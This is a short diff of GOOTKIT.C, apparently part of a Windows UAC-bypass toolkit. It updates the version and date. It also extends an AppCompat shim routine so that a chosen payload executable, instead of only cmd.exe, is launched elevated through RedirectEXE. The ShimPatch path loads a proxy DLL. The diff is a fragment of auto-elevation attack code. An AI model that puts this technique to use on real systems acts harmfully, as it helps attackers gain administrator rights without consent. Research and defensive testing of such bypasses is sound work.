@@ -6,9 +6,9 @@
 **
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     1.70
+*  VERSION:     1.90
 *
-*  DATE:        24 Apr 2015
+*  DATE:        17 Sept 2015
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -446,7 +446,8 @@ BOOL ucmShimPatch(
 BOOL ucmAppcompatElevation(
 	DWORD dwType,
 	CONST PVOID ProxyDll,
-	DWORD ProxyDllSize
+	DWORD ProxyDllSize,
+	LPWSTR lpszPayloadEXE
 	)
 {
 	BOOL cond = FALSE, bResult = FALSE;
@@ -472,10 +473,16 @@ BOOL ucmAppcompatElevation(
 
 		//create and register shim with RedirectEXE, cmd.exe as payload
 		if (dwType == METHOD_REDIRECTEXE) {
-			_strcpy_w(szBuffer, L"%systemroot%\\system32\\cmd.exe");
-			bResult = ucmShimRedirectEXE(szBuffer);
-		}
-		
+
+			if (lpszPayloadEXE == NULL) {
+				_strcpy_w(szBuffer, L"%systemroot%\\system32\\cmd.exe");
+				bResult = ucmShimRedirectEXE(szBuffer);
+			}
+			else {
+				bResult = ucmShimRedirectEXE(lpszPayloadEXE);
+			}
+			return bResult;
+		}  	
 		//create and register shim patch with fubuki as payload
 		if (dwType == METHOD_SHIMPATCH) {
 			bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
